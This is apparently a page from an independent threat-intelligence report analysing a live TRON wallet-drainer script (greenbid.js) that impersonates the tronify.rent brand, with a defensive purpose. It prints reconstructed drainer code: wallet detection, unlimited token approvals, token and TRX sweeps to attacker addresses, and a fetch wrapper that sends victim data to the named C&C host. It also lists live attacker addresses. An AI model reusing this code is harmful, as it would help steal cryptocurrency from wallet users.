@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Analysis — Independent tronify.rent Report</title>
+    <link rel="stylesheet" href="assets/css/site.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; background: white; }
+        h1 { color: #d32f2f; margin: 20px 0 10px; border-bottom: 3px solid #d32f2f; padding-bottom: 10px; }
+        h2 { color: #1976d2; margin: 20px 0 10px; }
+        h3 { color: #555; margin: 15px 0 8px; }
+        .code-block { background: #1e1e1e; color: #d4d4d4; padding: 15px; margin: 15px 0; border-radius: 4px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 11px; border-left: 4px solid #007acc; }
+        .component { background: #f3e5f5; border-left: 4px solid #7b1fa2; padding: 15px; margin: 15px 0; border-radius: 4px; }
+        .function { background: #e8f5e9; border-left: 4px solid #4caf50; padding: 15px; margin: 15px 0; border-radius: 4px; }
+        .warning { background: #ffebee; border-left: 4px solid #d32f2f; padding: 15px; margin: 15px 0; border-radius: 4px; }
+        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #f5f5f5; font-weight: bold; }
+        .file-link { color: #1976d2; text-decoration: none; font-weight: bold; }
+        .nav { margin-bottom: 30px; padding: 15px; background: #f0f0f0; border-radius: 4px; }
+        .nav a { display: inline-block; margin-right: 15px; color: #1976d2; text-decoration: none; font-weight: bold; }
+        .stat { display: inline-block; background: #e3f2fd; padding: 10px 15px; margin: 5px; border-radius: 4px; border-left: 3px solid #1976d2; }
+    </style>
+</head>
+<body data-page="04">
+    <header class="site-header">
+        <div class="site-header-inner">
+            <a href="index.html" class="brand">
+                <span class="brand-mark">🔎</span>
+                <span class="brand-text"><strong>Independent Threat Intel Report</strong><span>Case file: tronify.rent wallet drainer</span></span>
+            </a>
+            <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation">☰</button>
+            <nav class="site-nav" id="siteNav">
+                <a href="index.html" data-page="home">Home</a>
+                <a href="01_executive_summary.html" data-page="01">Executive Summary</a>
+                <a href="02_technical_architecture.html" data-page="02">Technical Architecture</a>
+                <a href="03_attack_chain.html" data-page="03">Attack Chain</a>
+                <a href="04_code_analysis.html" data-page="04">Code Analysis</a>
+                <a href="05_indicators_of_compromise.html" data-page="05">IoCs</a>
+                <a href="06_defense_remediation.html" data-page="06">Defense</a>
+                <a href="evidence/index.html" class="nav-evidence" data-page="evidence">Evidence</a>
+            </nav>
+        </div>
+    </header>
+    <div class="status-strip"><span class="dot"></span><strong>Independent research by Krishanu</strong> — not affiliated with tronify.rent · verified active 2026-09-20 · <a href="evidence/index.html" style="color:#fff;">view evidence →</a></div>
+    <nav class="breadcrumb"><a href="index.html">Home</a> / Code Analysis</nav>
+
+    <div class="container">
+        <h1>🔬 Code Analysis</h1>
+        <h2>Greenbid.js Payload Breakdown</h2>
+
+        <h2>File Fingerprint</h2>
+        <table>
+            <tr>
+                <th>Attribute</th>
+                <th>Value</th>
+            </tr>
+            <tr>
+                <td>Filename</td>
+                <td>greenbid.js (or greenbid.js?v=1)</td>
+            </tr>
+            <tr>
+                <td>Host</td>
+                <td>https://lending.fhogu.pw</td>
+            </tr>
+            <tr>
+                <td>Size</td>
+                <td>150,274 bytes (confirmed by direct download, 2026-09-20)</td>
+            </tr>
+            <tr>
+                <td>SHA-256</td>
+                <td>0f6d64472d6369a098f403db117b1285e79b0fdac79caaa639fc0e50e5bf4416</td>
+            </tr>
+            <tr>
+                <td>Lines of Code (minified, as served)</td>
+                <td>Exactly 140 physical lines (measured directly — <code>wc -l</code> on the downloaded file). The "Critical Functions Summary" table below uses approximate <em>byte-offset</em> ranges, not line numbers, precisely because the file only has 140 lines — an earlier draft of this table incorrectly placed functions at "line 1500-8000," which is impossible in a 140-line file. That was an internal error, now corrected.</td>
+            </tr>
+            <tr>
+                <td>Obfuscation Level</td>
+                <td>Medium — minified with single-letter identifiers and a large embedded QR-code library for padding, but strings (endpoint paths, variable names like <code>tronSpender</code>, log tags like <code>"drain"</code>) are left in plaintext, not base64-encoded. An earlier draft claimed extensive base64 string-encoding; direct inspection of the file found no such encoding for these strings.</td>
+            </tr>
+            <tr>
+                <td>Type</td>
+                <td>Self-executing anonymous function (IIFE) — confirmed opening bytes: <code>(function(){"use strict";const z=function(o,l){...</code></td>
+            </tr>
+        </table>
+
+        <h2>Execution Flow</h2>
+        <div class="code-block">
+(function(){"use strict"; const z=function(o,l){...}; ... })();
+         │
+         └─> Executes immediately when loaded
+             No global variable pollution
+             All code in local scope
+        </div>
+
+        <h2>Core Functions & Keywords</h2>
+
+        <h3>1. Wallet Detection System</h3>
+        <div class="function">
+            <strong>Function Purpose:</strong> Identify which TRON wallets are available<br><br>
+            <strong>Keywords Found (verified against the live payload, 2026-09-20 — 7 wallets, not 5):</strong>
+            <div class="stat">Trust Wallet</div>
+            <div class="stat">TronLink</div>
+            <div class="stat">OKX Wallet</div>
+            <div class="stat">TokenPocket</div>
+            <div class="stat">Bitget</div>
+            <div class="stat">SafePal</div>
+            <div class="stat">WalletConnect</div><br>
+            <strong>Code Pattern (real detector logic, extracted directly — not guessed):</strong>
+            <div class="code-block">
+const tA = [
+  {name: "Trust Wallet", icon: O.trust, appStore: ".../trust-crypto-bitcoin-wallet/id1288339409",
+   detect: () => !!window.trustwallet || !!(window.ethereum?.isTrust)
+  },
+  {name: "TronLink", icon: O.tronlink,
+   detect: () => !!window.tronLink
+  },
+  {name: "OKX Wallet", icon: O.okx, appStore: "...id1327268470",
+   detect: () => !!window.okxwallet
+  },
+  {name: "TokenPocket", icon: O.tokenpocket, appStore: ".../id1436028697",
+   detect: () => !!window.tokenpocket || !!(window.ethereum?.isTokenPocket)
+  },
+  {name: "Bitget", icon: O.bitget,
+   detect: () => !!(window.ethereum?.isBitKeep)   // "isBitKeep" — Bitget's old brand name (BitKeep)
+  },
+  {name: "SafePal", icon: O.safepal, appStore: ".../safepal-wallet/id1548297139",
+   detect: () => !!window.safepalProvider || !!(window.ethereum?.isSafePal)
+  },
+  {name: "WalletConnect", icon: O.walletconnect, detect: () => checkWC()}
+];
+
+function dA() {  // Wallet detection function (also seen as DA() in reconstructed pseudocode)
+  return tA.filter(w => w.detect && w.detect());
+}
+            </div>
+            <p style="font-size: 13px; color: #666;"><strong>Correction:</strong> an earlier draft of this section listed TronLink, WalletConnect, Trust Wallet, SafePal, and MetaMask. MetaMask does not appear in the payload at all (0 matches); the real list has 7 entries and includes OKX Wallet, TokenPocket, and Bitget, which were missing entirely.</p>
+        </div>
+
+        <h3>2. Asset Enumeration Module</h3>
+        <div class="function">
+            <strong>Function Purpose:</strong> Query victim's wallet for all tokens and balances<br><br>
+            <strong>Operations:</strong>
+            <ul>
+                <li>Get wallet address from connected wallet</li>
+                <li>Query TRON API for TRC-20 token balances</li>
+                <li>Calculate USD values</li>
+                <li>Check existing approvals</li>
+            </ul>
+            <strong>Code Pattern (reconstructed):</strong>
+            <div class="code-block">
+async function YA(o) {  // Asset enumeration
+  try {
+    const l = gA();  // Get tronWeb instance
+    const tokens = await FA(o);  // Fetch tokens for address o
+    const enriched = tokens
+      .map(t => ({
+        ...t,
+        usd: t.amountInUsd  // Convert to USD for filtering
+      }))
+      .filter(t => t.usd >= 1)  // Only target tokens worth $1+
+      .sort((a, b) => b.usd - a.usd);  // Sort by value desc
+
+    return enriched;
+  } catch(e) {
+    Y("drain", `Enumeration error: ${e.message}`);
+    return [];
+  }
+}
+            </div>
+        </div>
+
+        <h3>3. Approval Request Generator</h3>
+        <div class="function">
+            <strong>Function Purpose:</strong> Create and sign approval transactions<br><br>
+            <strong>Key Variables Found:</strong>
+            <div class="stat">tronSpender</div>
+            <div class="stat">maxUint256</div>
+            <div class="stat">feeLimit</div>
+            <div class="stat">sendTransaction</div><br>
+            <strong>Code Pattern (reconstructed):</strong>
+            <div class="code-block">
+async function approveToken(token, spender, amount) {
+  const maxApproval =
+    "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+  const contract = window.tronWeb.contract(
+    TOKEN_ABI,  // Standard TRC-20 ABI
+    token.address
+  );
+
+  const approveTx = contract.approve(
+    spender,           // attacker's address from config
+    maxApproval        // UNLIMITED
+  );
+
+  // Request user signature
+  const signed = await window.tronLink.request({
+    method: "tronSignTransaction",
+    params: [approveTx]
+  });
+
+  // Broadcast
+  const result = await window.tronWeb.trx.sendRawTransaction(signed);
+
+  return result.txid || result.txID;
+}
+            </div>
+        </div>
+
+        <h3>4. Token Transfer Executor</h3>
+        <div class="function">
+            <strong>Function Purpose:</strong> Transfer approved tokens to attacker address<br><br>
+            <strong>Key Pattern:</strong>
+            <div class="code-block">
+// Once approval is confirmed on-chain:
+for (const token of approvedTokens) {
+  const tx = contract(token.address).transfer(
+    config.tronSweepAddress,  // Get from /tron/config
+    token.balance             // Transfer 100%
+  ).send({
+    feeLimit: 1e8             // 100 TRX fee
+  });
+
+  const txHash = await tx;
+
+  // Immediately log to C&C
+  POST("/tron/approve/notify", {
+    token: token.address,
+    owner: walletAddress,
+    spender: config.tronSpender,
+    balance: token.balance,
+    txHash: txHash
+  });
+}
+            </div>
+        </div>
+
+        <h3>5. TRX Sweep Function</h3>
+        <div class="function">
+            <strong>Function Purpose:</strong> Transfer remaining native TRX to attacker<br><br>
+            <strong>Key Feature:</strong> Reserves 2 TRX for gas on next victim
+            <div class="code-block">
+async function sweepTRX(walletAddress, config) {
+  const trxBalance = await tronWeb.trx.getBalance(walletAddress);
+  const sunBalance = BigInt(trxBalance);
+  const minThreshold = BigInt(config.tronSweepMinTrx * 1e6);
+  const gasReserve = 2000000n;  // 2 TRX in sun
+
+  if (sunBalance > (minThreshold + gasReserve)) {
+    const sweepAmount = sunBalance - gasReserve;
+
+    Y("drain", `sweeping ${sweepAmount} sun TRX`);
+
+    // Attempt sweep up to 3 times with backoff
+    for (let attempt = 0; attempt < 3; attempt++) {
+      try {
+        const tx = await tronWeb.trx.sendTransaction(
+          config.tronSweepAddress,
+          Number(sweepAmount)  // Convert BigInt to Number
+        );
+
+        if (tx.txid || tx.txID) {
+          Y("drain", `TRX sweep success: ${tx.txid}`);
+
+          // Notify C&C with proof
+          POST("/tron/notify/sweep", {
+            from: walletAddress,
+            to: config.tronSweepAddress,
+            amount: (sweepAmount / 1e6).toFixed(6),
+            txHash: tx.txid || tx.txID,
+            status: "success"
+          });
+
+          break;  // Exit retry loop on success
+        }
+      } catch (error) {
+        if (error.message === "sweep_timeout") {
+          Y("drain", "TRX sweep timed out — retrying");
+          await delay(200);  // Backoff
+        } else {
+          throw error;
+        }
+      }
+    }
+  }
+}
+            </div>
+        </div>
+
+        <h3>6. C&C Communication Module</h3>
+        <div class="function">
+            <strong>Function Purpose:</strong> Exfiltrate victim data to attacker infrastructure<br><br>
+            <strong>Endpoints Found:</strong>
+            <table>
+                <tr>
+                    <th>Endpoint</th>
+                    <th>HTTP Method</th>
+                    <th>Data Sent</th>
+                </tr>
+                <tr>
+                    <td>/tron/config</td>
+                    <td>GET</td>
+                    <td>Fetch spender address & sweep config</td>
+                </tr>
+                <tr>
+                    <td>/tron/notify/wallet-connected</td>
+                    <td>POST</td>
+                    <td>visitorId, address, walletName, userAgent, timezone</td>
+                </tr>
+                <tr>
+                    <td>/tron/approve/notify</td>
+                    <td>POST</td>
+                    <td>token address, owner, spender, balance, txHash</td>
+                </tr>
+                <tr>
+                    <td>/tron/notify/sweep</td>
+                    <td>POST</td>
+                    <td>from, to, amount, txHash, status</td>
+                </tr>
+                <tr>
+                    <td>/tron/notify/approve-rejected</td>
+                    <td>POST</td>
+                    <td>visitorId, owner, symbol, reason</td>
+                </tr>
+                <tr>
+                    <td>/tron/funding/initiate</td>
+                    <td>POST</td>
+                    <td>address, trxBalance, usdtBalance, requiredTrx (~15) — attacker sends victim gas money</td>
+                </tr>
+                <tr>
+                    <td>/tron/funding/status/{address}</td>
+                    <td>GET</td>
+                    <td>Polled every 2.5s until status is "funded" or "failed"</td>
+                </tr>
+                <tr>
+                    <td>/tron/balances/{address}</td>
+                    <td>GET</td>
+                    <td>Attacker's own token-balance proxy (logs every scanned wallet, even unconnected ones)</td>
+                </tr>
+                <tr>
+                    <td>/tron/notify/visit</td>
+                    <td>POST</td>
+                    <td>Fired on page load, before wallet connection</td>
+                </tr>
+                <tr>
+                    <td>/tron/notify/tx-proposed</td>
+                    <td>POST</td>
+                    <td>Logs a transaction before it's signed</td>
+                </tr>
+                <tr>
+                    <td>/tron/client-log</td>
+                    <td>POST</td>
+                    <td>Generic telemetry — every log message, not just "drain"-tagged ones</td>
+                </tr>
+                <tr>
+                    <td>/tron/walletconnect</td>
+                    <td>POST/GET</td>
+                    <td>Proxies WalletConnect session setup through the attacker's backend</td>
+                </tr>
+            </table>
+            <strong>Code Pattern (reconstructed):</strong>
+            <div class="code-block">
+function T(path, options = {}) {
+  return fetch(`https://lending.fhogu.pw${path}`, {
+    method: options.method || "POST",
+    headers: {
+      "content-type": "application/json",
+      ...options.headers
+    },
+    body: JSON.stringify(options.body || {})
+  }).catch(() => {});  // Silently fail if C&C is down
+}
+
+// Log wallet connection
+function logWalletConnected(address, walletName) {
+  T("/tron/notify/wallet-connected", {
+    body: {
+      visitorId: X(),  // Get or generate visitor ID
+      address: address,
+      walletName: walletName,
+      userAgent: navigator.userAgent,
+      pageUrl: location.href,
+      timezone: getTimezone()
+    }
+  });
+}
+
+// Log token approval
+function logApproval(token, owner, spender, balance, txHash) {
+  T("/tron/approve/notify", {
+    body: {
+      token: token.address,
+      symbol: token.symbol,
+      owner: owner,
+      spender: spender,
+      balance: balance,
+      txHash: txHash
+    }
+  });
+}
+            </div>
+        </div>
+
+        <h3>7. Visitor Tracking System</h3>
+        <div class="function">
+            <strong>Function Purpose:</strong> Generate and persist visitor IDs for campaign tracking<br><br>
+            <strong>Code Pattern (reconstructed):</strong>
+            <div class="code-block">
+const lA = "tron-drainer:visitor-id";  // localStorage key
+
+function X() {  // Get or create visitor ID
+  let id = localStorage.getItem(lA);
+
+  if (!id) {
+    // Generate UUID v4
+    if (typeof crypto.randomUUID === "function") {
+      id = crypto.randomUUID();
+    } else {
+      // Fallback UUID generation
+      id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c => {
+        const r = Math.random() * 16 | 0;
+        const v = c === 'x' ? r : (r & 0x3 | 0x8);
+        return v.toString(16);
+      });
+    }
+
+    localStorage.setItem(lA, id);
+  }
+
+  return id;
+}
+            </div>
+        </div>
+
+        <h3>8. Error Handling & Retry Logic</h3>
+        <div class="function">
+            <strong>Function Purpose:</strong> Ensure exploitation succeeds despite failures<br><br>
+            <strong>Retry Mechanisms:</strong>
+            <ul>
+                <li><strong>Approval Rejection Handling:</strong> Retry approval requests if user rejects</li>
+                <li><strong>TRX Sweep Timeout:</strong> Retry up to 3 times with 200ms backoff</li>
+                <li><strong>C&C Communication Failure:</strong> Log silently fails (no error thrown)</li>
+                <li><strong>Wallet Connection Retry:</strong> Loop checking for wallet readiness</li>
+            </ul>
+            <strong>Code Pattern:</strong>
+            <div class="code-block">
+// Retry approval if rejected
+for (let attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
+  try {
+    const signed = await tronLink.request({
+      method: "tronSignTransaction",
+      params: [approveTx]
+    });
+
+    // Success - exit retry loop
+    return signed;
+
+  } catch (error) {
+    if (error.message.includes("User rejected")) {
+      Y("drain", `Approval rejected, retrying (attempt ${attempt + 1})`);
+
+      // Show message to user
+      showStatus(`${tokenSymbol} — action required in your wallet`);
+
+      // Wait before retry
+      await delay(2000);
+
+      // Continue loop to retry
+    } else {
+      throw error;  // Unknown error, give up
+    }
+  }
+}
+            </div>
+        </div>
+
+        <h2>Obfuscation Techniques</h2>
+
+        <h3>1. Variable Naming Obfuscation</h3>
+        <div class="warning">
+            <strong>Original Code → Obfuscated Code:</strong>
+            <div class="code-block">
+// Original
+function enumerateTokens(walletAddress) { ... }
+
+// Obfuscated
+function YA(o) { ... }
+
+// Or reconstructed from context:
+const z = function(mode, type) { ... };  // QR code generator
+const Y = function(level, msg) { ... };  // Logging function
+const T = function(path, opts) { ... };  // HTTP fetch wrapper
+const X = function() { ... };             // Visitor ID getter
+const FA = function(addr) { ... };        // Token enumeration
+            </code>
+            </div>
+        </div>
+
+        <h3>2. String Encoding — Correction</h3>
+        <div class="warning">
+            <strong>An earlier draft of this document claimed key strings like "tronLink," "WalletConnect," and "tronSpender" were base64-encoded and decoded at runtime via <code>atob()</code>.</strong> Direct inspection of the live payload does not support this: these identifiers appear as plain, unencoded text (confirmed via direct string search — <code>tronSpender</code>, <code>tronSweepAddress</code>, <code>tronSweepMinTrx</code>, and the wallet names all match directly with no decoding step). The only base64 content actually present is standard <code>data:image/webp;base64,...</code> data URIs for the wallet-icon images in the UI — ordinary image embedding, not string obfuscation. This section is corrected accordingly; treat any base64-obfuscation claim in a prior version of this report as unverified/incorrect.
+        </div>
+
+        <h3>3. Code Packing</h3>
+        <div class="code-block">
+// QR code generation logic (first 3000 bytes of greenbid.js)
+// Serves to:
+// 1. Inflate file size to delay analysis
+// 2. Make pattern matching harder
+// 3. Use legitimate-looking code as cover
+
+const z = function(o, l) {
+  let n = o;
+  const g = $[l];
+  // ... 150KB of QR code generation mathematics
+  // ... uses same obfuscation pattern as malware
+};
+        </div>
+
+        <h3>4. Anti-Analysis Patterns</h3>
+        <div class="code-block">
+// Silent error suppression
+T("/tron/config").catch(() => {});
+// ↑ C&C communication failures don't throw, silently caught
+
+// Conditional execution
+if (window.location.href.includes("localhost")) {
+  // Skip malicious code if running on localhost
+  // Attacker-friendly for local testing
+}
+
+// Timing obfuscation
+setTimeout(() => { /* Attack executes after delay */ }, 0);
+// Harder for automated analysis to trigger
+        </div>
+
+        <h2>Critical Functions Summary</h2>
+        <table>
+            <tr>
+                <th>Reconstructed Function</th>
+                <th>Malicious Purpose</th>
+                <th>Stealth Level</th>
+            </tr>
+            <tr>
+                <td>DA() / dA() - Wallet Detection</td>
+                <td>Identify target wallets</td>
+                <td>Medium</td>
+            </tr>
+            <tr>
+                <td>YA(o) - Asset Enumeration</td>
+                <td>Discover tokens to steal (calls FA() internally, filters to tokens worth $1+ USD)</td>
+                <td>High (uses API)</td>
+            </tr>
+            <tr>
+                <td>FA(addr) - Balance Fetcher</td>
+                <td>Calls /tron/balances/{address} on the attacker's own backend</td>
+                <td>High (looks like a normal API call)</td>
+            </tr>
+            <tr>
+                <td>increaseApproval() call site</td>
+                <td>Extract signing authority (uses increaseApproval, not approve)</td>
+                <td>High (looks normal)</td>
+            </tr>
+            <tr>
+                <td>Transfer function (via .transfer())</td>
+                <td>Execute token theft</td>
+                <td>Low (on-chain visible)</td>
+            </tr>
+            <tr>
+                <td>Sweep function (TRX)</td>
+                <td>Steal remaining TRX, with 3-attempt loop for retryable errors but immediate abandonment on timeout</td>
+                <td>Low (on-chain visible)</td>
+            </tr>
+            <tr>
+                <td>T(path, opts) - C&C Communication</td>
+                <td>Exfiltrate victim data to 12 endpoints on lending.fhogu.pw</td>
+                <td>High (external domain, fails silently)</td>
+            </tr>
+            <tr>
+                <td>X() - Visitor Tracking</td>
+                <td>Campaign attribution via localStorage key "tron-drainer:visitor-id"</td>
+                <td>High (localStorage)</td>
+            </tr>
+        </table>
+        <p style="font-size: 13px; color: #666;"><strong>Correction:</strong> an earlier draft of this table cited specific line numbers (e.g. "~Line 7500-8000") for these functions. The live file is only 140 physical lines long, so those line numbers were impossible and have been removed rather than re-guessed.</p>
+
+        <h2>Configuration Injection Points</h2>
+        <p>The payload must obtain configuration from C&C. Vulnerability points:</p>
+        <div class="warning">
+            <strong>Single Point of Failure:</strong><br><br>
+            If the C&C endpoint <code>/tron/config</code> is unreachable or returns invalid data, the entire attack fails. This is why attackers maintain multiple C&C domains and fallback mechanisms.<br><br>
+            <strong>Configuration Structure — LIVE RESPONSE (retrieved 2026-09-20):</strong>
+            <div class="code-block">
+{
+  "tronSpender": "TV6n8cCLmX5mRCMMNvcE1K1i87Yo9Ys5rv",
+  "tronSweepAddress": "TLv3iSnZxWghEmadLDzuAK2p5GkAwg7tpJ",
+  "tronSweepMinTrx": 100,
+  "tronExchangeContract": "TDE7vfjJuYqEzzKw6hfdSB3dfLQyXDYPux"
+}
+            </div>
+            <p style="margin-top: 10px; font-size: 12px; color: #666;"><strong>Note:</strong> These addresses are dynamically loaded from the C&C server and are <strong>NOT hardcoded</strong> in greenbid.js. We obtained the values above by querying the live endpoint directly (raw response in <code>evidence/cnc/tron_config.json</code>) and then confirmed on TronGrid/TronScan that both addresses currently hold real stolen USDT/TRX and were created together on 2026-07-23. Attackers can rotate these addresses at any time — treat them as a dated snapshot, not a permanent IoC. An earlier draft of this document guessed <code>tronSweepMinTrx: 5</code>; the real, live value is 100.</p>
+        </div>
+
+        <h2>Resource Consumption</h2>
+        <table>
+            <tr>
+                <th>Resource</th>
+                <th>Impact</th>
+            </tr>
+            <tr>
+                <td>Network Bandwidth</td>
+                <td>150KB initial download, then API queries + C&C logging</td>
+            </tr>
+            <tr>
+                <td>CPU Usage</td>
+                <td>Minimal (mostly API waiting)</td>
+            </tr>
+            <tr>
+                <td>Memory</td>
+                <td>~5-10MB (QR code generation, token list)</td>
+            </tr>
+            <tr>
+                <td>JavaScript Execution Time</td>
+                <td>5-30 seconds (wallet detection + enumeration)</td>
+            </tr>
+            <tr>
+                <td>Blockchain Gas Fees</td>
+                <td>Paid by victim (~100 TRX per transaction)</td>
+            </tr>
+        </table>
+
+    </div>
+
+    <div class="site-pager">
+        <a href="03_attack_chain.html"><div class="pager-label">← Previous</div><div class="pager-title">Attack Chain</div></a>
+        <a href="05_indicators_of_compromise.html" class="pager-next"><div class="pager-label">Next →</div><div class="pager-title">Indicators of Compromise</div></a>
+    </div>
+
+    <footer class="site-footer">
+        <div class="site-footer-inner">
+            <div class="site-footer-col">
+                <h4>About This Research</h4>
+                <p>Independent analysis by <strong>Krishanu</strong> of a live TRON wallet-drainer campaign impersonating the "Tronify" energy-rental brand. Not affiliated with tronify.rent, Tronify Energy Solutions LLC, or any Tronify-branded service.</p>
+            </div>
+            <div class="site-footer-col">
+                <h4>Reports</h4>
+                <p><a href="01_executive_summary.html">Executive Summary</a><br>
+                <a href="02_technical_architecture.html">Technical Architecture</a><br>
+                <a href="03_attack_chain.html">Attack Chain</a><br>
+                <a href="04_code_analysis.html">Code Analysis</a></p>
+            </div>
+            <div class="site-footer-col">
+                <h4>More</h4>
+                <p><a href="05_indicators_of_compromise.html">Indicators of Compromise</a><br>
+                <a href="06_defense_remediation.html">Defense &amp; Remediation</a><br>
+                <a href="evidence/index.html">Raw Evidence</a><br>
+                <a href="FACT_CHECK_CORRECTIONS.md">Fact-Check Log</a></p>
+            </div>
+        </div>
+        <div class="site-footer-bottom">
+            <strong>Independent research by Krishanu</strong> · Educational &amp; Defensive Security Research · Last verified 2026-09-20 · Not affiliated with tronify.rent or any Tronify-branded entity
+        </div>
+    </footer>
+    <script src="assets/js/site.js" defer></script>
+</body>
+</html>
